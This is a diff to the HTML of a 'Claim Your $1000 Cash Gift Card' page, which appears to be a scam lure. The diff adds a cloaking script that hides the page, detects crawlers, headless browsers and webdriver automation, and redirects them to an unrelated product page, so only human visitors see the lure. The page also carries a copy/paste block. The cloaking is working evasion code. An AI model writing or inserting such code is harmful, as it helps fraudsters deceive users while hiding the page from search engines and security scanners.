@@ -1,9 +1,26 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
+  <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Claim Your $1000 Cash Gift Card</title>
+  <!-- Anti-bot script and initial hide -->
+  <style>html{display:none!important;}</style>
+  <script>
+    (function(){
+      const ua = navigator.userAgent || '';
+      const isBot = /HeadlessChrome|bot|crawler|spider|slurp|bingbot|Googlebot/i.test(ua)
+                  || navigator.webdriver === true;
+      if (isBot) {
+        // Redirect bots to safe URL
+        window.location.href = 'https://meridianshoppe.com/products/asa-duffle-bag';
+      } else {
+        // Reveal page for real users
+        document.documentElement.style.display = '';
+      }
+    })();
+  </script>
+  <!-- Existing styles -->
   <style>
     @import url('https://fonts.googleapis.com/css2?family=Canva+Sans:wght@400;700&display=swap');
     /* Prevent copy/paste */
@@ -52,7 +69,7 @@
     @keyframes fadeIn { from { opacity: 0; transform: translateY(10px);} to { opacity: 1; transform: translateY(0);} }
   </style>
 </head>
-<body oncontextmenu="return false;">
+<body>
   <div class="top-section">
     <img src="Cash Logo.png" alt="Cash Logo" class="card-image" />
   </div>
